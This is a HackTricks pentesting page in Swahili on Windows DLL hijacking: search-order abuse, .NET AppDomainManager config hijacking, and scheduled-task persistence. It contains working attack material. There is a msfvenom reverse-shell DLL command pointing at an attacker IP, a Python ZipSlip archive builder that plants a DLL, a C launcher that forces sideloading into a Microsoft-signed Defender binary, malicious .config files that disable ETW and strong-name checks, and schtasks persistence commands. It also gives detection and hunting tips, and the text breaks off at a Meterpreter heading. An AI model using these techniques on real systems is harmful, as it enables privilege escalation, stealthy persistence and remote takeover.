# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Taarifa za Msingi

DLL Hijacking huhusisha kudanganya programu inayoaminika ili ipakie DLL hasidi. Neno hili linajumuisha mbinu kadhaa kama **DLL Spoofing, Injection, and Side-Loading**. Hutumika hasa kwa code execution, kupata persistence, na, mara chache zaidi, privilege escalation. Ingawa hapa tunalenga escalation, mbinu ya hijacking hubaki ileile bila kujali lengo.

### Mbinu za Kawaida

Mbinu kadhaa hutumika kwa DLL hijacking, na ufanisi wa kila moja hutegemea mkakati wa programu wa kupakia DLL:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Kubadilisha DLL halisi na DLL hasidi, na ikiwezekana kutumia DLL Proxying kuhifadhi utendakazi wa DLL asilia.
2. **DLL Search Order Hijacking**: Kuweka DLL hasidi kwenye njia ya utafutaji iliyo mbele ya DLL halali, na kutumia mpangilio wa utafutaji wa programu.
3. **Phantom DLL Hijacking**: Kuunda DLL hasidi ambayo programu itaipakia ikidhani kuwa ni DLL inayohitajika lakini haipo.
4. **DLL Redirection**: Kurekebisha vigezo vya utafutaji kama `%PATH%` au faili za `.exe.manifest` / `.exe.local` ili kuelekeza programu kwenye DLL hasidi.
5. **WinSxS DLL Replacement**: Kubadilisha DLL halali na mbadala hasidi kwenye saraka ya WinSxS; mbinu hii mara nyingi huhusishwa na DLL side-loading.
6. **Relative Path DLL Hijacking**: Kuweka DLL hasidi kwenye saraka inayodhibitiwa na mtumiaji pamoja na programu iliyonakiliwa, kwa kufanana na mbinu za Binary Proxy Execution.

Programu inaweza pia kutekeleza **kipakiaji chake cha DLL**. Mchakato wenye mapendeleo unaweza kuorodhesha saraka tanzu kama `Libraries` au `Plugins` na kupitisha DLL iliyochaguliwa kwa programu saidizi, bila kutegemea mpangilio wa kawaida wa utafutaji wa DLL wa Windows. Ikiwa akaunti nyingine inaweza kuunda faili kwenye saraka hiyo mahususi, lichukulie hili kama jambo la kuchunguza: thibitisha utambulisho wa mchakato, ACL inayotumika ya saraka, kanuni ya kuchagua faili, na uwezekano wa kufikia operesheni ya kupakia DLL. Saraka inayoweza kuandikika iliyo karibu na faili inayotekelezeka haithibitishi kwamba mchakato hupakia DLL kutoka humo.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading si njia pekee ya kufanya mchakato wa **.NET Framework** unaoaminika upakie msimbo wa mshambuliaji. Ikiwa programu inayolengwa ni programu ya **managed**, CLR pia hukagua **faili ya usanidi wa programu** iliyopewa jina la faili inayotekelezeka (kwa mfano `Setup.exe.config`). Faili hiyo inaweza kufafanua **AppDomainManager** maalum. Ikiwa config inaelekeza kwenye assembly inayodhibitiwa na mshambuliaji na iliyowekwa karibu na EXE, CLR huipakia **kabla ya mtiririko wa kawaida wa msimbo wa programu** na kuiendesha ndani ya mchakato unaoaminika.<sup>[[24]](#references)</sup>

Kulingana na schema ya usanidi ya .NET Framework ya Microsoft, `<appDomainManagerAssembly>` na `<appDomainManagerType>` zote lazima ziwepo ili manager maalum itumike.<sup>[[16]](#references)[[17]](#references)</sup>

Config ndogo zaidi:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Kidhibiti cha chini kabisa:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Vidokezo vya vitendo:
- Hii ni mbinu mahususi ya **.NET Framework**. Inategemea uchanganuzi wa usanidi wa CLR, si mpangilio wa utafutaji wa Win32 DLL.
- Host lazima kweli iwe **managed EXE**. Triage ya haraka: `sigcheck -m target.exe`, `corflags target.exe`, au angalia **CLR Runtime Header** katika metadata ya PE.
- Jina la faili la usanidi lazima lilingane kabisa na jina la executable (`<binary>.config`) na kwa kawaida huwa **karibu na EXE**.
- Hii ni muhimu kwa **binary za Microsoft/vendor zilizosainiwa** kwa sababu EXE inayoaminika hubaki bila kubadilishwa, huku malicious managed assembly ikitekelezwa ndani ya mchakato.
- Ikiwa tayari una saraka ya installer/update inayoweza kuandikika, AppDomainManager hijacking inaweza kutumika kama **hatua ya kwanza**, ikifuatiwa na DLL sideloading ya kawaida au reflective loading kwa hatua zinazofuata.

### AppDomainManager kama downloader + bootstrap ya taski iliyopangwa

Mfumo wa vitendo wa intrusion ni kuoanisha managed EXE inayoaminika na `*.config` hasidi pamoja na AppDomainManager DLL hasidi inayofanya kazi kama **bootstrapper ndogo**:<sup>[[25]](#references)</sup>

1. Mtumiaji anazindua installer au updater iliyosainiwa ya .NET kutoka eneo linaloaminika, kama `%USERPROFILE%\Downloads`.
2. Config iliyo karibu husababisha CLR kupakia assembly ya mshambuliaji **kabla** mantiki halali ya programu haijaanza.
3. Manager hasidi hutekeleza **ukaguzi wa path** (kwa mfano, kuendelea tu ikiwa host EXE inaendeshwa kutoka `Downloads`, na kuruhusu hatua ya pili iendeshwe tu kutoka `%LOCALAPPDATA%`).
4. Ikiwa ukaguzi utafaulu, inapakua payload halisi kwenye path inayoweza kuandikika na mtumiaji, kama `%LOCALAPPDATA%\PerfWatson2.exe`, na kuweka persistence kupitia taski iliyopangwa.

Kwa nini toleo hili ni muhimu:
- Host EXE iliyosainiwa hubaki bila kubadilishwa, kwa hiyo triage inayokagua hash ya binary kuu pekee inaweza kukosa udukuzi.
- **Uchambuzi wa kupinga unaotegemea path** ni wa kawaida: kuhamisha jozi ya ZIP/EXE/DLL hadi Desktop, Temp, au path ya sandbox kunaweza kuvunja mnyororo kimakusudi.
- AppDomainManager DLL ya hatua ya kwanza inaweza kubaki ndogo na isiyovutia huku implant halisi ikipakuliwa baadaye.

Mfano mdogo wa persistence unaoonekana mara nyingi katika mfumo huu:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notes:
- ` /rl highest` inamaanisha **kiwango cha juu zaidi kinachopatikana** kwa mtumiaji/kikao hicho; chenyewe hakihakikishi kupandishwa hadi SYSTEM.
- Mbinu hii mara nyingi huainishwa vizuri zaidi kama **utekelezaji/udumishaji kupitia matumizi mabaya ya usanidi wa .NET** kuliko utekaji wa kawaida wa mpangilio wa utafutaji wa DLL zisizopatikana, ingawa waendeshaji mara nyingi huziunganisha mbinu zote mbili.

Vigezo vya ugunduzi:
- Executables za .NET zilizosainiwa zinazoendeshwa kutoka **njia za uchimbuaji wa ZIP**, `Downloads`, `%TEMP%`, au folda nyingine zinazoweza kuandikwa na mtumiaji zikiwa na faili ya `<exe>.config` **iliyowekwa pamoja nazo**.
- Scheduled tasks mpya ambazo kitendo chake kinaelekeza kwenye `%LOCALAPPDATA%`, `%APPDATA%`, au `Downloads`, na ambazo majina yake yanafanana na majina ya visasishaji vya browser/vendor.
- Michakato ya muda mfupi ya managed bootstrap inayopakua EXE nyingine mara moja, kisha kuwasha `schtasks.exe`.
- Sampuli zinazositisha utekelezaji mapema isipokuwa njia ya executable ilingane na folda ya wasifu wa mtumiaji inayotarajiwa.

### Kuteka scheduled task iliyopo ili kuanzisha tena msururu wa sideload

Kwa ajili ya persistence, usitafute **kuunda task mpya** pekee. Baadhi ya makundi ya wavamizi husubiri hadi kisakinishi halali kitengeneze **task ya kawaida ya kusasisha**, kisha **huandika upya kitendo cha task** ili jina, mwandishi na kichochezi kilichopo viendelee kuonekana vya kawaida kwa watetezi.

Mtiririko wa kazi unaoweza kutumika tena:
1. Sakinisha/endesha programu halali na utambue task ambayo kwa kawaida huiunda.
2. Hamisha XML ya task na uandike thamani za sasa za `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Badilisha kitendo pekee ili task ianzishe **EXE host inayoaminika** kutoka kwenye folda ya maandalizi inayoweza kuandikwa na mtumiaji; kisha EXE hiyo husideload au kupakia payload halisi kupitia AppDomain.
4. Sajili upya task yenye jina lilelile badala ya kuunda artefakti mpya ya persistence iliyo wazi.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Kwa nini ni fiche zaidi:
- Jina la task bado linaweza kuonekana halali (kwa mfano, updater ya vendor).
- **Task Scheduler service** ndiyo inayoizindua, kwa hivyo ukaguzi wa parent/ancestor mara nyingi huona mlolongo wa scheduling unaotarajiwa badala ya `explorer.exe`.
- Timu za DFIR zinazotafuta tu **majina mapya ya task** zinaweza kukosa task ambayo usajili wake ulikuwepo tayari lakini action yake sasa inaelekeza kwenye `%LOCALAPPDATA%`, `%APPDATA%`, au njia nyingine inayodhibitiwa na mshambuliaji.

Njia za haraka za hunting:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Linganisha XML za `C:\Windows\System32\Tasks\*` na metadata za `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` dhidi ya baseline.
- Weka alert task ya updater **inayoonekana kana kwamba ni ya vendor** inapotekelezwa kutoka **directories ambazo mtumiaji anaweza kuandika** au inapozindua .NET EXE yenye faili ya `*.config` iliyo kwenye directory hiyo hiyo.

> [!TIP]
> Kwa mnyororo wa hatua kwa hatua unaounganisha HTML staging, configs za AES-CTR, na .NET implants juu ya DLL sideloading, kagua workflow iliyo hapa chini.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Kutafuta DLL zinazokosekana

Njia ya kawaida zaidi ya kupata Dlls zinazokosekana ndani ya mfumo ni kuendesha [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) kutoka sysinternals, **ukiweka** **filters 2 zifuatazo**:

![Mbinu za Kawaida - Kutafuta DLL zinazokosekana: Njia ya kawaida zaidi ya kupata DLL zinazokosekana ndani ya mfumo ni kuendesha procmon kutoka sysinternals, ukiweka filters 2 zifuatazo](<../../../images/image (961).png>)

![Mbinu za Kawaida - Kutafuta DLL zinazokosekana: Njia ya kawaida zaidi ya kupata DLL zinazokosekana ndani ya mfumo ni kuendesha procmon kutoka sysinternals, ukiweka filters 2 zifuatazo](<../../../images/image (230).png>)

na uonyeshe tu **File System Activity**:

![Mbinu za Kawaida - Kutafuta DLL zinazokosekana: na uonyeshe tu File System Activity](<../../../images/image (153).png>)

Ikiwa unatafuta **DLL zinazokosekana kwa jumla**, **iacha** ikiendelea kwa **sekunde** kadhaa.\
Ikiwa unatafuta **DLL inayokosekana ndani ya executable mahususi**, weka filter nyingine kama **"Process Name" "contains" `<exec name>`**, iendeshe, kisha usimamishe kunasa matukio.<sup>[[9]](#references)</sup>

## Kutumia DLL zinazokosekana

Ili kupandisha privileges, tafuta **DLL ambayo process yenye privileges inajaribu kuipakia** kutoka mahali unapoweza kuandika. Hili linaweza kutokea unapodhibiti directory inayotafutwa kabla ya directory iliyo na DLL halali, au wakati DLL iliyoombwa haipo na unaweza kuandika kwenye mojawapo ya directories zinazotafutwa.

### Mpangilio wa Utafutaji wa DLL

**Ndani ya** [**nyaraka za Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **unaweza kupata maelezo mahususi kuhusu jinsi Dlls zinavyopakiwa.**

**Windows applications** hutafuta DLL kwa kufuata seti ya **njia za utafutaji zilizofafanuliwa awali**, kwa mfuatano maalumu. Tatizo la DLL hijacking hutokea wakati DLL hatari inapowekwa kimkakati kwenye mojawapo ya directories hizi, ili ipakuliwe kabla ya DLL halisi. Njia moja ya kuzuia hili ni kuhakikisha application inatumia absolute paths inaporejelea DLL inayohitaji.

Unaweza kuona **mpangilio wa utafutaji wa DLL kwenye mifumo ya 32-bit** hapa chini:

1. Directory ambayo application ilipakiwa kutoka humo.
2. System directory. Tumia function ya [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) kupata njia ya directory hii.(_C:\Windows\System32_)
3. System directory ya 16-bit. Hakuna function inayopata njia ya directory hii, lakini inatafutwa. (_C:\Windows\System_)
4. Windows directory. Tumia function ya [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) kupata njia ya directory hii.
   1. (_C:\Windows_)
5. Directory ya sasa.
6. Directories zilizoorodheshwa kwenye environment variable ya PATH. Kumbuka kwamba hii haijumuishi njia ya kila application iliyobainishwa na registry key ya **App Paths**. Key ya **App Paths** haitumiki wakati wa kukokotoa njia ya utafutaji wa DLL.

Huu ndio mpangilio wa utafutaji wa **chaguo-msingi** wakati **SafeDllSearchMode** imewashwa. Ikiwa imezimwa, directory ya sasa hupanda hadi nafasi ya pili. Ili kuzima kipengele hiki, tengeneza registry value ya **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** na uiweke kuwa 0 (kwa chaguo-msingi imewashwa).

Ikiwa function ya [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) itaitwa kwa **LOAD_WITH_ALTERED_SEARCH_PATH**, utafutaji huanza kwenye directory ya executable module ambayo **LoadLibraryEx** inapakia.

Hatimaye, DLL inaweza kupakiwa kwa absolute path badala ya jina. Katika hali hiyo, Windows hutafuta DLL yenyewe kwenye njia hiyo pekee; dependencies zinazoombwa kwa jina bado hufuata mpangilio husika wa utafutaji.

Kuna njia nyingine za kubadilisha mpangilio wa utafutaji, lakini sitazieleza hapa.

### Kuunganisha uandishi holela wa faili na utekaji nyara wa DLL inayokosekana

**Mbinu inayohusiana:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Tumia filters za **ProcMon** (`Process Name` = target EXE, `Path` inaishia na `.dll`, `Result` = `NAME NOT FOUND`) kukusanya majina ya DLL ambazo process inajaribu kutafuta lakini haiwezi kupata.<sup>[[14]](#references)</sup>
2. Ikiwa binary inaendeshwa kwa **ratiba/kama service**, kuweka DLL yenye mojawapo ya majina hayo kwenye **application directory** (nafasi ya #1 kwenye mpangilio wa utafutaji) kutafanya ipakuliwe wakati wa utekelezaji unaofuata. Katika kisa kimoja cha .NET scanner, process ilitafuta `hostfxr.dll` kwenye `C:\samples\app\` kabla ya kupakia nakala halisi kutoka `C:\Program Files\dotnet\fxr\...`.
3. Tengeneza payload DLL (kwa mfano, reverse shell) yenye export yoyote: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Ikiwa primitive yako ni **uandishi holela wa mtindo wa ZipSlip**, tengeneza ZIP ambayo entry yake inatoka nje ya extraction dir ili DLL iwekwe kwenye app folder:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Peleka archive kwenye inbox/share inayofuatiliwa; task iliyoratibiwa itakapozindua upya mchakato, utapakia DLL hasidi na kutekeleza code yako kama akaunti ya service.

### Kulazimisha sideloading kupitia RTL_USER_PROCESS_PARAMETERS.DllPath

Njia ya kina ya kudhibiti kwa uhakika njia ya utafutaji ya DLL ya mchakato mpya ni kuweka sehemu ya DllPath katika RTL_USER_PROCESS_PARAMETERS wakati wa kuunda mchakato kwa kutumia native APIs za ntdll. Kwa kutoa directory inayodhibitiwa na mshambulizi hapa, mchakato lengwa unaotafuta DLL iliyoingizwa kwa jina (bila kutumia absolute path wala safe loading flags) unaweza kulazimishwa kupakia DLL hasidi kutoka kwenye directory hiyo.

Wazo kuu
- Jenga process parameters kwa kutumia RtlCreateProcessParametersEx na utoe DllPath maalum inayoelekeza kwenye folder unayodhibiti (kwa mfano, directory ilipo dropper/unpacker yako).
- Unda mchakato kwa kutumia RtlCreateUserProcess. Binary lengwa inapotafuta DLL kwa jina, loader itatumia DllPath hii wakati wa utafutaji, na hivyo kuwezesha sideloading ya kuaminika hata kama DLL hasidi haipo kwenye directory moja na EXE lengwa.

Maelezo/vikwazo
- Hili huathiri child process inayoundwa; ni tofauti na SetDllDirectory, inayoathiri current process pekee.
- Target lazima i-import au iite LoadLibrary kwa DLL kwa jina (bila absolute path na bila kutumia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs na absolute paths zilizowekwa moja kwa moja haziwezi kuhijackiwa. Forwarded exports na SxS zinaweza kubadilisha mpangilio wa kipaumbele.

Mfano mdogo wa C (ntdll, wide strings, ushughulikiaji wa makosa uliorahisishwa):

<details>
<summary>Mfano kamili wa C: kulazimisha DLL sideloading kupitia RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Mfano wa matumizi ya kiutendaji
- Weka xmllite.dll hasidi (inayotoa functions zinazohitajika au kuelekeza maombi kwa DLL halisi) kwenye saraka yako ya DllPath.
- Zindua binary iliyosainiwa inayojulikana kutafuta xmllite.dll kwa jina kwa kutumia mbinu iliyo hapo juu. Loader hutatua import kupitia DllPath iliyotolewa na kusideload DLL yako.

Mbinu hii imeonekana ikitumika porini kuendesha minyororo ya sideloading ya hatua nyingi: launcher ya awali huweka helper DLL, ambayo kisha huzindua binary iliyosainiwa na Microsoft inayoweza kuhijackiwa, ikiwa na DllPath maalum ili kulazimisha kupakia DLL ya mshambuliaji kutoka saraka ya maandalizi.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking kupitia `.exe.config`

Kwa walengwa wa **.NET Framework**, sideloading inaweza kufanywa **kabla ya `Main()`** bila kurekebisha memory kwa kutumia vibaya faili ya **`.exe.config`** iliyo karibu na programu. Badala ya kutegemea tu mpangilio wa utafutaji wa Win32 DLL, mshambuliaji huweka EXE halali ya .NET karibu na config hasidi na assembly moja au zaidi zinazodhibitiwa na mshambuliaji.

Jinsi mnyororo huo unavyofanya kazi:<sup>[[15]](#references)[[22]](#references)</sup>
1. EXE mwenyeji huanza na **CLR husoma `<exe>.config`**.
2. Config huweka **`<appDomainManagerAssembly>`** na **`<appDomainManagerType>`** ili runtime iunde `AppDomainManager` inayodhibitiwa na mshambuliaji.
3. Manager hasidi hupata **utekelezaji kabla ya `Main()`** ndani ya mchakato wa mwenyeji unaoaminika.
4. Config hiyo hiyo inaweza kulazimisha CLR kutatua assembly za ndani kwanza (kwa mfano `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`), na inaweza kudhoofisha uthibitishaji/telemetry ya runtime bila inline patching.

Muundo wa kampeni (upachikaji halisi unaweza kutofautiana kulingana na directive / toleo la CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Kwa nini hii ni muhimu:
- **`<probing privatePath="."/>`** huweka utatuzi wa assembly kwenye saraka ya programu, na kuifanya folda hiyo kuwa eneo linalotabirika la sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** huhamisha utekelezaji kwenye msimbo wa mshambulizi wakati wa uanzishaji wa CLR, kabla mantiki halali ya programu haijaanza kufanya kazi.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** inaweza kuruhusu programu ya full-trust kupakia assemblies ambazo hazijasainiwa au zimechezewa, bila hitilafu ya uthibitishaji wa strong-name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** huzuia uelekezaji upya wa publisher-policy kwenda kwenye assemblies mpya zaidi.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** hufanya uteuzi wa runtime uweze kutabirika zaidi.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** inavutia hasa kwa sababu **CLR huzima mwonekano wake yenyewe wa ETW** kupitia usanidi, badala ya implant kurekebisha `EtwEventWrite` kwenye kumbukumbu.

Muundo wa kiutendaji ulioonekana kwenye kampeni za hivi karibuni:
- Hatua ya 1 huhifadhi `setup.exe`, `setup.exe.config`, na assemblies za ndani.
- Hatua ya 2 huzinakili kwenye folda ya **AppData update** inayoonekana halali, huipa host jina jipya kama `update.exe`, kisha huiwasha upya kupitia **scheduled task**.
- Hatua ya 3 huthibitisha muktadha wa utekelezaji (kwa mfano, mchakato mzazi anayetarajiwa `svchost.exe` kutoka Task Scheduler) kabla ya kupakia RAT DLL/export ya mwisho.

Mawazo ya kutafuta:
- **.NET executables** zilizosainiwa au zinazoonekana halali kwa namna nyingine, zinazoendeshwa zikiwa na faili **`.config`** za kutiliwa shaka karibu nazo kwenye maeneo yanayoweza kuandikiwa na mtumiaji.
- Faili za `.config` zilizo na **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, au **`etwEnable enabled="false"`**.
- Scheduled tasks zinazoanzisha upya binaries za update zilizopewa majina mapya kutoka **`%LOCALAPPDATA%`** au saraka mahususi za programu za `\bin\update\`.
- Mifuatano ya michakato mzazi/mtoto ambapo scheduled task huwasha host ya .NET inayoaminika, ambayo mara moja hupakia assemblies zisizo za mtengenezaji kutoka kwenye saraka yake yenyewe.

#### Vighairi vya mpangilio wa utafutaji wa DLL vilivyo kwenye nyaraka za Windows

Nyaraka za Windows zinataja vighairi fulani kwa mpangilio wa kawaida wa utafutaji wa DLL:

- Mfumo unapokutana na **DLL yenye jina sawa na ile ambayo tayari imepakiwa kwenye kumbukumbu**, huruka utafutaji wa kawaida. Badala yake, hukagua uelekezaji upya na manifest kabla ya kutumia DLL ambayo tayari iko kwenye kumbukumbu. **Katika hali hii, mfumo hautafuti DLL**.
- DLL inapotambuliwa kama **known DLL** kwa toleo la sasa la Windows, mfumo hutumia toleo lake la known DLL, pamoja na DLL zozote zinazotegemewa nayo, **bila kufanya utafutaji**. Ufunguo wa registry **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** una orodha ya known DLL hizi.
- **DLL inapokuwa na dependencies**, utafutaji wa DLL hizo tegemezi hufanywa kana kwamba zimetajwa kwa **majina ya moduli pekee**, bila kujali kama DLL ya awali ilitambuliwa kupitia njia kamili.

### Kuongeza Haki

**Masharti**:

- Tambua mchakato unaoendeshwa au utakaoendeshwa chini ya **haki tofauti** (usogezaji wa mlalo au wa upande), ambao **unakosa DLL**.
- Hakikisha kuwa kuna **ruhusa ya kuandika** kwenye **saraka** yoyote ambamo **DLL** itatafutwa. Eneo hili linaweza kuwa saraka ya executable au saraka iliyo ndani ya system path.

Masharti haya si ya kawaida kwa chaguo-msingi: executable zenye haki za juu kwa kawaida hazikosi dependencies za DLL, na watumiaji wa kawaida kwa kawaida hawawezi kuandika kwenye saraka za system search-path. Hata hivyo, mazingira yaliyosanidiwa vibaya yanaweza kufichua masharti yote mawili.\
Masharti yakitimia, angalia mradi wa [UACME](https://github.com/hfiref0x/UACME). Ingawa lengo lake kuu ni UAC bypass, una PoC za DLL hijacking za matoleo mahususi ya Windows ambazo mara nyingi zinaweza kurekebishwa ili zitumie saraka inayoweza kuandikiwa uliyoipata.

Kumbuka kuwa unaweza **kuangalia ruhusa zako kwenye folda** kwa kufanya:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Na **angalia ruhusa za folda zote zilizo ndani ya PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Unaweza pia kukagua imports za executable na exports za dll kwa kutumia:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Kwa mwongozo kamili wa jinsi ya **kutumia vibaya DLL Hijacking ili kuongeza marupurupu** ukiwa na ruhusa ya kuandika kwenye **folda ya System Path**, angalia:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Zana otomatiki

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)itaangalia kama una ruhusa za kuandika kwenye folda yoyote iliyo ndani ya system PATH.\
Zana nyingine otomatiki zinazovutia za kugundua athari hii ni **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ na _Write-HijackDll._

### Mfano

Ukigundua hali inayoweza kutumiwa vibaya, mojawapo ya mambo muhimu zaidi ili kuitumia kwa mafanikio ni **kuunda dll inayotoa angalau functions zote ambazo executable itazi-import kutoka humo**. Hata hivyo, kumbuka kuwa DLL Hijacking inaweza kusaidia [kuongeza marupurupu kutoka kiwango cha Medium Integrity hadi High **(kwa kukwepa UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) au kutoka[ **High Integrity hadi SYSTEM**](../index.html#from-high-integrity-to-system)**.** Unaweza kupata mfano wa **jinsi ya kuunda dll halali** ndani ya utafiti huu wa DLL hijacking unaolenga DLL hijacking kwa ajili ya utekelezaji: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Zaidi ya hayo, katika **sehemu inayofuata** unaweza kupata baadhi ya **misimbo ya msingi ya dll** ambayo inaweza kuwa muhimu kama **violezo** au kwa kuunda **dll yenye functions zisizohitajika zilizotolewa**.

## **Kuunda na kukompaila DLLs**

### **DLL Proxifying**

Kimsingi, **DLL proxy** ni DLL inayoweza **kutekeleza msimbo wako hasidi inapopakiwa**, lakini pia **kuweka wazi** na **kufanya kazi** kama **inavyotarajiwa** kwa **kuelekeza upya miito yote kwenye library halisi**.

Ukitumia zana ya [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) au [**Spartacus**](https://github.com/Accenture/Spartacus), unaweza **kubainisha executable na kuchagua library** unayotaka ku-proxify na **kutengeneza dll iliyoproxifyiwa**, au **kubainisha DLL** na **kutengeneza dll iliyoproxifyiwa**.

### **Meterpreter**

**Pata rev shell (x64):**

